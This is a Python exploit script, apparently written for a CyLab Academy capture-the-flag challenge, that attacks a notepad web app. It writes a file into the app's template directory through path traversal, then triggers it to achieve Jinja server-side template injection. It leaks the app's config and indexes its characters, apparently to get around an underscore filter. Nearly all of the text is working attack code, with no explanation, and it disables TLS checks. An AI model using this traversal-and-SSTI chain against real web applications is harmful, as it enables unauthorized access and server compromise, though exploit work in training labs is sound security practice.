import sys, requests, re, html as H
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
requests.packages.urllib3.disable_warnings()
BASE = "https://notepad.mars.cylabacademy.net"
S = requests.Session()
S.headers.update({"User-Agent": "Mozilla/5.0"})


def go(tpl):
    content = "\\..\\templates\\errors\\z" + tpl
    r = S.post(BASE + "/new", data={"content": content}, timeout=25, verify=False, allow_redirects=False)
    loc = r.headers.get("Location", "")
    m = re.search(r"/static/(.+?)\.html$", loc)
    if not m:
        return None
    name = m.group(1).split("/")[-1]
    rr = S.get(BASE + "/", params={"error": name}, timeout=25, verify=False)
    txt = H.unescape(rr.text)
    after = txt.split("</h3>", 1)[-1]
    return after.split("<h2>")[0].strip()


vis = go("{{config|string}}")
print("repr config:", vis[:300])
cfg = vis.replace("\\..\\templates\\errors\\z", "")
k = cfg.find("_")
print("\nindex du premier '_':", k)
print("char a cet index:", repr(cfg[k]) if k >= 0 else None)

# verifier
chk = go("{{(config|string)[%d]}}" % k)
print("verification (config|string)[%d] ->" % k, repr(chk))
